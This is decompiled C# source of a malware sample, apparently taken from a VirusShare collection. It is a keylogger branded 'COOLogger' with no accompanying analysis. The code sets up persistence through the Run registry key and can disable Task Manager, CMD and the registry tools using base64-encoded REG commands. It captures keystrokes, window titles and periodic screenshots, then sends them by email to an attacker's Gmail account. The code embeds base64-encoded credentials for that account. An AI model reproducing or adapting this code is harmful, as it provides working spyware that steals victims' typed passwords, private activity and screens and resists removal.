// Decompiled with JetBrains decompiler
// Type: xoOdWGnqLnrGQly
// Assembly: new one, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B6715D8B-1139-456B-A765-023B173E1580
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00018-msil\Trojan-Ransom.Win32.Blocker.ikjm-78fbbdeb5842197bb7643fd0a7469b94dccdfa12d122898a7122f51cd7f58666.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class xoOdWGnqLnrGQly
{
  private static string lYzVUwevhlLlwqJ = "bGV3aXNyaGlub3RoaW5rQGdtYWlsLmNvbQ==";
  private static string GdyXPLXoDYMVtnR = "ZGl2aW5pdHkxNjkx";
  private static string TzUZhXDMMLPmtBf = "smtp.gmail.com";
  private static int rrHLOGetmWEHbEI = 587;
  private static string oOdWGnqLnrGQlyl;
  private static string YzVUwevhlLlwqJG;
  private static string dyXPLXoDYMVtnRT;
  private static string zUZhXDMMLPmtBfr;
  private static string rHLOGetmWEHbEIW;
  private static string RHmuvtykdkPbbqu;
  private static int CNHZJfPafcnFTbc = 600000;
  private static string mIVjRiUYxmjdvsQ = (string) null;
  private static string uxBsRgZJqtOquJT = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string oCobDZXzhykoOoz = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string tMJgCaSParGbPYw = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object WTCPooQYkNgMjCb = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string lKFhjQWpxnTOPNS = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage DKRhJIYOQIhKomV = new MailMessage();
  private static SmtpClient eJsodxnesDllYLm = new SmtpClient();
  [AccessedThroughProperty("GplZukbpziiVIiF")]
  private static IVjRiUYxmjdvsQl _GplZukbpziiVIiF;
  private static object JUXmIJTcXBRjEXR;
  private static RichTextBox BeJsodxnesDllYL;

  static xoOdWGnqLnrGQly()
  {
    xoOdWGnqLnrGQly.GplZukbpziiVIiF = new IVjRiUYxmjdvsQl();
    xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR = (object) Path.GetFileName(Application.ExecutablePath);
    xoOdWGnqLnrGQly.BeJsodxnesDllYL = new RichTextBox();
  }

  private static IVjRiUYxmjdvsQl GplZukbpziiVIiF
  {
    get => xoOdWGnqLnrGQly._GplZukbpziiVIiF;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (xoOdWGnqLnrGQly._GplZukbpziiVIiF != null)
        IVjRiUYxmjdvsQl.KeyDown -= new IVjRiUYxmjdvsQl.KeyDownEventHandler(xoOdWGnqLnrGQly.xBsRgZJqtOquJTo);
      xoOdWGnqLnrGQly._GplZukbpziiVIiF = value;
      if (xoOdWGnqLnrGQly._GplZukbpziiVIiF == null)
        return;
      IVjRiUYxmjdvsQl.KeyDown += new IVjRiUYxmjdvsQl.KeyDownEventHandler(xoOdWGnqLnrGQly.xBsRgZJqtOquJTo);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int BSeSQKcZvfqwsEV(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    xoOdWGnqLnrGQly.RHmuvtykdkPbbqu = Conversions.ToString(true);
    xoOdWGnqLnrGQly.dyXPLXoDYMVtnRT = Conversions.ToString(false);
    xoOdWGnqLnrGQly.zUZhXDMMLPmtBfr = Conversions.ToString(false);
    xoOdWGnqLnrGQly.rHLOGetmWEHbEIW = Conversions.ToString(false);
    xoOdWGnqLnrGQly.YzVUwevhlLlwqJG = Conversions.ToString(false);
    xoOdWGnqLnrGQly.oOdWGnqLnrGQlyl = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\KRhJIYOQIhKomVJ.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(xoOdWGnqLnrGQly.lKFhjQWpxnTOPNS + "\\KRhJIYOQIhKomVJ.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(xoOdWGnqLnrGQly.oOdWGnqLnrGQlyl) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR), Operators.ConcatenateObject(Operators.ConcatenateObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), xoOdWGnqLnrGQly.JUXmIJTcXBRjEXR));
    if (Conversions.ToBoolean(xoOdWGnqLnrGQly.YzVUwevhlLlwqJG))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\KRhJIYOQIhKomVJ.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(xoOdWGnqLnrGQly.dyXPLXoDYMVtnRT))
      Interaction.Shell(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.uxBsRgZJqtOquJT), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(xoOdWGnqLnrGQly.zUZhXDMMLPmtBfr))
      Interaction.Shell(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.oCobDZXzhykoOoz), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(xoOdWGnqLnrGQly.rHLOGetmWEHbEIW))
      Interaction.Shell(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.tMJgCaSParGbPYw), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 600000;
    timer1.Tick += new EventHandler(xoOdWGnqLnrGQly.SgNfRVujgaspMiH_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(xoOdWGnqLnrGQly.NJUXmIJTcXBRjEX_Ticked);
    timer2.Start();
    xoOdWGnqLnrGQly.GplZukbpziiVIiF.KQMYbpLNWgaEUmH();
    Application.Run();
  }

  private static string WrsDaHkzgnGOEje()
  {
    string lpString = new string(char.MinValue, 100);
    xoOdWGnqLnrGQly.BSeSQKcZvfqwsEV(xoOdWGnqLnrGQly.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string CobDZXzhykoOozt(string ivuLORJhwpZIKeH) => Encoding.ASCII.GetString(Convert.FromBase64String(ivuLORJhwpZIKeH));

  public static void SgNfRVujgaspMiH_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(xoOdWGnqLnrGQly.RHmuvtykdkPbbqu))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = xoOdWGnqLnrGQly.HaUKpyyxCngnSee(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(xoOdWGnqLnrGQly.WTCPooQYkNgMjCb, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.lYzVUwevhlLlwqJ));
        message.To.Add(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.lYzVUwevhlLlwqJ));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = xoOdWGnqLnrGQly.BeJsodxnesDllYL.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.lYzVUwevhlLlwqJ), xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.GdyXPLXoDYMVtnR))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        xoOdWGnqLnrGQly.BeJsodxnesDllYL.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage dkRhJiyoqIhKomV = xoOdWGnqLnrGQly.DKRhJIYOQIhKomV;
      dkRhJiyoqIhKomV.From = new MailAddress(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.lYzVUwevhlLlwqJ));
      dkRhJiyoqIhKomV.To.Add(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.lYzVUwevhlLlwqJ));
      dkRhJiyoqIhKomV.Subject = "COOLogger Logs from - " + Environment.UserName;
      dkRhJiyoqIhKomV.Body = xoOdWGnqLnrGQly.BeJsodxnesDllYL.Text;
      SmtpClient eJsodxnesDllYlm = xoOdWGnqLnrGQly.eJsodxnesDllYLm;
      eJsodxnesDllYlm.Host = "smtp.gmail.com";
      eJsodxnesDllYlm.Port = 587;
      eJsodxnesDllYlm.EnableSsl = true;
      eJsodxnesDllYlm.Credentials = (ICredentialsByHost) new NetworkCredential(xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.lYzVUwevhlLlwqJ), xoOdWGnqLnrGQly.CobDZXzhykoOozt(xoOdWGnqLnrGQly.GdyXPLXoDYMVtnR));
      eJsodxnesDllYlm.Send(xoOdWGnqLnrGQly.DKRhJIYOQIhKomV);
      xoOdWGnqLnrGQly.BeJsodxnesDllYL.Text = "";
    }
  }

  public static void xBsRgZJqtOquJTo(Keys e) => xoOdWGnqLnrGQly.BeJsodxnesDllYL.Text += xoOdWGnqLnrGQly.GplZukbpziiVIiF.aUKpyyxCngnSeeu(e);

  public static void NJUXmIJTcXBRjEX_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(xoOdWGnqLnrGQly.mIVjRiUYxmjdvsQ, xoOdWGnqLnrGQly.WrsDaHkzgnGOEje(), false) == 0)
      return;
    xoOdWGnqLnrGQly.mIVjRiUYxmjdvsQ = xoOdWGnqLnrGQly.WrsDaHkzgnGOEje();
    if (Operators.CompareString(xoOdWGnqLnrGQly.mIVjRiUYxmjdvsQ, "", false) == 0)
      return;
    RichTextBox beJsodxnesDllYl = xoOdWGnqLnrGQly.BeJsodxnesDllYL;
    beJsodxnesDllYl.Text = beJsodxnesDllYl.Text + "\r\n\r\n~~~~~" + xoOdWGnqLnrGQly.mIVjRiUYxmjdvsQ + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string HaUKpyyxCngnSee(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
